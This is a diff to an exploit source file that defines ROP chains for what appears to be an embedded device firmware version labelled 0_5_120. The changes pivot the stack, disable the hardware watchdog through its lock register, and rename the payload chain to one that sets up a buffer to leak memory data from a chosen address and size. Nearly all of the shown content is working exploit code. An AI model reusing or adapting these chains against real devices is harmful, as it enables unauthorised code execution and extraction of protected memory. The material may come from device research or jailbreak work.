@@ -116,7 +116,7 @@ uint32_t init_ropchain_0_5_120[] = {
     0x0, 0x0, // r4, r5
     // since we want to move to 0x420, and our current sp is entry + (4 * 9 u32s = 0x24), that is 0x420 + 0x24, which is 0x444
     0x444, // r6 (value to decrement from the SP)
-    GADGET_SET_U32_INIT_POP___0_5_120, // r7 (entry payload gadget pc)
+    GADGET_MAX_POP___0_5_120, // r7 (entry payload gadget pc, standardize using MAX_POP)
     // moves SP into r1 and also moves r6 into r0
     GADGET_MOVE_SP_INTO_R1___0_5_120, // pc
 
@@ -143,7 +143,10 @@ uint32_t init_ropchain_0_5_120[] = {
 };
 
 // the payload ROP chain. here, we will have a lot of space to do whatever we want.
-uint32_t main_ropchain_0_5_120[] = {
+uint32_t leak_data_main_ropchain_0_5_120[] = {
+    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, // r3, r4, r5, r6, r7, r8, r9, r10, r11
+    GADGET_SET_U32_VAL___0_5_120, // pc
+
     // ==== DISABLE WATCHDOG ====
     // *(uint32_t*)0x40500c00 = 0x1acce551
     GC_WATCHDOG_WDOGLOCK, 0x0, 0x1acce551, // r4, r5, r6
@@ -172,15 +175,15 @@ uint32_t main_ropchain_0_5_120[] = {
 
     // == create our hex array struct ==
 
-    // *(uint32_t*)0x19000 = 0x0
-    DATA_STRUCT_HEX_BUFFER_buffer___0_5_120, 0x0, ADDRESS_LEAK_START_MAGIC, 0x0, // r4, r5, r6, r7
+    // *(uint32_t*)0x19000 = val
+    DATA_STRUCT_HEX_BUFFER_buffer___0_5_120, 0x0, LEAK_DATA_ADDRESS_MAGIC, 0x0, // r4, r5, r6, r7
     GADGET_SET_U32_VAL___0_5_120, // pc
 
     0x0, 0x0, 0x0, 0x0, // r4, r5, r6, r7
     GADGET_SET_U16_INIT_POP___0_5_120, // pc
 
     // *(uint16_t*)0x19004 = size
-    ADDRESS_LEAK_SIZE_MAGIC, DATA_STRUCT_HEX_BUFFER_size___0_5_120, 0x0, // r3, r4, r5
+    LEAK_DATA_SIZE_MAGIC, DATA_STRUCT_HEX_BUFFER_size___0_5_120, 0x0, // r3, r4, r5
     GADGET_SET_U16_VAL___0_5_120, // pc
 
     0x0, 0x0, 0x0, // r3, r4, r5
